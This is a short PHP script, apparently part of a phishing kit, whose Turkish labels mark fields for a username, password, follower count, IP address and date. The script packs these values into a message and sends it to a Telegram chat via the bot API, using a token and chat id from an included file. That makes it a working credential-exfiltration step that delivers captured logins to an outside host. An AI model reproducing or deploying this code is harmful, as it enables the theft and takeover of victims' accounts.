<?php
include 'tokenandchatid.php';
    $data = [
        'text' => ' 
Kullanıcı Adı: '.$blind.' 

Kullanıcı Adı : '.$blind.'
Şifre : '.$blindP.'
Takipçi : '.$takipci.'
ip : '.$ip.'
Tarih : '.$tarih.'
      ',
  'chat_id' => $chat_id
    ];
    
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


  
?>